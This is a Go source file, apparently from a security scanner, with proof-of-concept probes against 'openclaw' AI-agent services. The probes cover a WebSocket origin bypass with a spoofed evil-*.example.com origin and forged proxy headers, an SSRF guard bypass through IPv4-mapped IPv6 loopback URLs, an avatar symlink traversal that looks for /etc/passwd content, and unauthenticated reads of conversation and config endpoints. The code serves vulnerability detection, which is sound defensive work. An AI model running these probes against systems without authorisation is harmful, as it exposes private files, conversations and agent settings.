package l3

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type PoCResult struct {
	Name          string
	CVEID         string
	CNNVDID       string
	GHSAID        string
	Success       bool
	Severity      string
	CVSS          float64
	Description   string
	DescriptionZH string
	Evidence      string
	Remediation   string
}

type pocRunner func(ip string, port int, timeout time.Duration, rule PoCRule) PoCResult

var openClawPoCRunners = map[string]pocRunner{
	"ws_origin_bypass": pocWSOriginBypass,
	"ssrf_proxy":       pocSSRF,
	"avatar_symlink_traversal": pocAvatarSymlinkTraversal,
	"unauth_api":       pocUnauthAPI,
}

func RunPoCs(ip string, port int, agentType string, timeout time.Duration) []PoCResult {
	if agentType != "openclaw" {
		return nil
	}

	var results []PoCResult
	for _, rule := range getPoCRules() {
		runner, ok := openClawPoCRunners[rule.ID]
		if !ok {
			continue
		}
		results = append(results, runner(ip, port, timeout, rule))
	}
	return results
}

func pocWSOriginBypass(ip string, port int, timeout time.Duration, rule PoCRule) PoCResult {
	result := newPoCResult(rule)
	client := &http.Client{Timeout: timeout}

	healthURL := fmt.Sprintf("http://%s:%d/health", ip, port)
	resp, err := client.Get(healthURL)
	if err != nil {
		result.Description = "Health endpoint unavailable, skipped precise trusted-proxy WebSocket origin bypass probe"
		result.Evidence = fmt.Sprintf("health_url=%s error=%v", healthURL, err)
		return result
	}

	var health struct {
		AuthMode string `json:"auth_mode"`
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if err := json.Unmarshal(body, &health); err != nil {
		result.Description = "Health endpoint response could not be parsed, skipped precise trusted-proxy WebSocket origin bypass probe"
		result.Evidence = fmt.Sprintf("health_url=%s status=%d body=%s", healthURL, resp.StatusCode, string(body))
		return result
	}
	if health.AuthMode != "trusted-proxy" {
		result.Description = "Target is not advertising trusted-proxy mode, so the precise CVE-2026-32302 probe was not treated as exploitable"
		result.Evidence = fmt.Sprintf("health_url=%s auth_mode=%s", healthURL, health.AuthMode)
		return result
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: timeout,
		NetDialContext:   (&net.Dialer{Timeout: timeout}).DialContext,
	}

	evilOrigin := fmt.Sprintf("http://evil-%s.example.com", randomHex(4))

	wsURL := fmt.Sprintf("ws://%s:%d/ws", ip, port)
	headers := http.Header{
		"Origin":            []string{evilOrigin},
		"X-Forwarded-For":   []string{"127.0.0.1"},
		"X-Forwarded-Host":  []string{fmt.Sprintf("%s:%d", ip, port)},
		"X-Forwarded-Proto": []string{"https"},
	}

	conn, wsResp, err := dialer.Dial(wsURL, headers)
	if err != nil {
		wsURL = fmt.Sprintf("ws://%s:%d/api/ws", ip, port)
		conn, wsResp, err = dialer.Dial(wsURL, headers)
	}
	if err != nil {
		result.Description = "Trusted-proxy WebSocket origin bypass probe was rejected or the endpoint was unreachable (good)"
		result.Evidence = fmt.Sprintf("dial error: %v", err)
		return result
	}
	defer conn.Close()

	result.Success = true
	result.Description = fmt.Sprintf("Trusted-proxy WebSocket accepted an untrusted Origin '%s' together with proxy headers", evilOrigin)
	result.DescriptionZH = fmt.Sprintf("目标在 trusted-proxy 模式下接受了不受信任来源 %s 携带代理头建立的 WebSocket 连接，说明存在来源校验绕过风险。", evilOrigin)
	result.Evidence = fmt.Sprintf("ws=%s origin=%s auth_mode=%s http_status=%d", wsURL, evilOrigin, health.AuthMode, wsResp.StatusCode)

	conn.SetReadLimit(4096)
	_ = conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"ping"}`))
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, msg, readErr := conn.ReadMessage()
	if readErr == nil {
		result.Evidence += fmt.Sprintf(" recv=%s", string(msg))
	}

	return result
}

func pocSSRF(ip string, port int, timeout time.Duration, rule PoCRule) PoCResult {
	result := newPoCResult(rule)
	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	loopbackTargets := []string{
		fmt.Sprintf("http://[0:0:0:0:0:ffff:7f00:1]:%d/health", port),
		fmt.Sprintf("http://[0:0:0:0:0:ffff:7f00:1]:%d/api/health", port),
	}

	proxyEndpoints := []string{
		fmt.Sprintf("http://%s:%d/api/fetch?url=%%s", ip, port),
		fmt.Sprintf("http://%s:%d/api/v1/proxy?target=%%s", ip, port),
	}

	for _, target := range loopbackTargets {
		for _, endpoint := range proxyEndpoints {
			requestURL := fmt.Sprintf(endpoint, url.QueryEscape(target))
			resp, err := client.Get(requestURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()

			bodyStr := string(body)
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, `"ok":true`) || strings.Contains(bodyStr, `"status":"live"`) || strings.Contains(bodyStr, `"version"`)) {
				result.Success = true
				result.Description = "SSRF guard bypass accepted a full-form IPv4-mapped IPv6 loopback target"
				result.DescriptionZH = "代理接口接受了全写形式的 IPv4 映射 IPv6 回环地址，说明 SSRF 防护可被该地址格式绕过。"
				result.Evidence = fmt.Sprintf("endpoint=%s target=%s status=%d body=%s", requestURL, target, resp.StatusCode, bodyStr)
				return result
			}
		}
	}

	postEndpoints := []string{
		fmt.Sprintf("http://%s:%d/api/proxy", ip, port),
		fmt.Sprintf("http://%s:%d/api/v1/fetch", ip, port),
	}
	for _, target := range loopbackTargets {
		payloadBody := fmt.Sprintf(`{"url":"%s"}`, target)
		for _, endpoint := range postEndpoints {
			resp, err := client.Post(endpoint, "application/json", strings.NewReader(payloadBody))
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()

			bodyStr := string(body)
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, `"ok":true`) || strings.Contains(bodyStr, `"status":"live"`) || strings.Contains(bodyStr, `"version"`)) {
				result.Success = true
				result.Description = "SSRF guard bypass via POST accepted a full-form IPv4-mapped IPv6 loopback target"
				result.DescriptionZH = "POST 代理接口接受了全写形式的 IPv4 映射 IPv6 回环地址，说明 SSRF 防护可被该地址格式绕过。"
				result.Evidence = fmt.Sprintf("endpoint=%s target=%s status=%d body=%s", endpoint, target, resp.StatusCode, bodyStr)
				return result
			}
		}
	}

	result.Description = "Full-form IPv4-mapped IPv6 SSRF probe was blocked or the proxy endpoint was unavailable (good)"
	result.Evidence = "proxy/fetch endpoints returned 404/403 or rejected full-form IPv4-mapped IPv6 loopback targets"
	return result
}

func pocAvatarSymlinkTraversal(ip string, port int, timeout time.Duration, rule PoCRule) PoCResult {
	result := newPoCResult(rule)
	client := &http.Client{Timeout: timeout}

	configURL := fmt.Sprintf("http://%s:%d/__openclaw/control-ui-config.json", ip, port)
	resp, err := client.Get(configURL)
	if err != nil {
		result.Description = "Control UI config endpoint unavailable, skipped avatar traversal probe"
		result.Evidence = fmt.Sprintf("config_url=%s error=%v", configURL, err)
		return result
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		result.Description = "Control UI config endpoint not exposed, skipped avatar traversal probe"
		result.Evidence = fmt.Sprintf("config_url=%s status=%d", configURL, resp.StatusCode)
		return result
	}

	var config struct {
		AssistantAgentID string `json:"assistantAgentId"`
		BasePath         string `json:"basePath"`
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err := json.Unmarshal(body, &config); err != nil {
		result.Description = "Control UI config payload could not be parsed, skipped avatar traversal probe"
		result.Evidence = fmt.Sprintf("config_url=%s status=%d body=%s", configURL, resp.StatusCode, string(body))
		return result
	}

	agentID := strings.TrimSpace(config.AssistantAgentID)
	if agentID == "" {
		agentID = "main"
	}

	basePath := strings.TrimRight(strings.TrimSpace(config.BasePath), "/")
	avatarURL := fmt.Sprintf("http://%s:%d%s/avatar/%s", ip, port, basePath, url.PathEscape(agentID))
	avatarResp, err := client.Get(avatarURL)
	if err != nil {
		result.Description = "Avatar endpoint unavailable, avatar traversal probe did not complete"
		result.Evidence = fmt.Sprintf("avatar_url=%s error=%v", avatarURL, err)
		return result
	}
	defer avatarResp.Body.Close()

	avatarBody, _ := io.ReadAll(io.LimitReader(avatarResp.Body, 4096))
	avatarText := string(avatarBody)
	if avatarResp.StatusCode == http.StatusOK &&
		(strings.Contains(avatarText, "root:") || strings.Contains(avatarText, "daemon:") || strings.Contains(avatarText, "/bin/")) {
		result.Success = true
		result.Description = "Control UI avatar endpoint returned non-image local file content"
		result.DescriptionZH = "控制台头像接口返回了明显不属于图片资源的本地文件内容，说明存在头像符号链接越界读取。"
		result.Evidence = fmt.Sprintf("avatar_url=%s status=%d body_preview=%s", avatarURL, avatarResp.StatusCode, avatarText)
		return result
	}

	result.Description = "Avatar endpoint did not expose obvious out-of-workspace file contents (good)"
	result.Evidence = fmt.Sprintf("avatar_url=%s status=%d", avatarURL, avatarResp.StatusCode)
	return result
}

func pocUnauthAPI(ip string, port int, timeout time.Duration, rule PoCRule) PoCResult {
	result := newPoCResult(rule)
	client := &http.Client{Timeout: timeout}

	sensitiveEndpoints := []struct {
		path string
		desc string
	}{
		{"/api/skills", "Skills enumeration"},
		{"/api/v1/skills", "Skills enumeration (v1)"},
		{"/api/conversations", "Conversation history"},
		{"/api/v1/conversations", "Conversation history (v1)"},
		{"/api/settings", "Agent settings"},
		{"/api/v1/config", "Agent configuration"},
	}

	var accessible []string
	for _, ep := range sensitiveEndpoints {
		url := fmt.Sprintf("http://%s:%d%s", ip, port, ep.path)
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			accessible = append(accessible, fmt.Sprintf("%s (%s)", ep.path, ep.desc))
		}
	}

	if len(accessible) > 0 {
		result.Success = true
		result.Description = fmt.Sprintf("%d sensitive endpoint(s) accessible without authentication", len(accessible))
		result.DescriptionZH = fmt.Sprintf("检测到 %d 个敏感接口可在未认证情况下直接访问。", len(accessible))
		result.Evidence = "accessible: " + strings.Join(accessible, "; ")
	} else {
		result.Description = "All sensitive endpoints require authentication (good)"
		result.Evidence = "all tested endpoints returned 401/403/404"
	}

	return result
}

func newPoCResult(rule PoCRule) PoCResult {
	return PoCResult{
		Name:        rule.Name,
		CVEID:       rule.CVEID,
		CNNVDID:     rule.CNNVDID,
		GHSAID:      rule.GHSAID,
		Severity:    rule.Severity,
		CVSS:        rule.CVSS,
		Remediation: rule.Remediation,
	}
}

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func isJSON(b []byte) bool {
	var v any
	return json.Unmarshal(b, &v) == nil
}

func isHTML(s string) bool {
	return strings.Contains(s, "<html") || strings.Contains(s, "<!DOCTYPE") || strings.Contains(s, "<HTML")
}
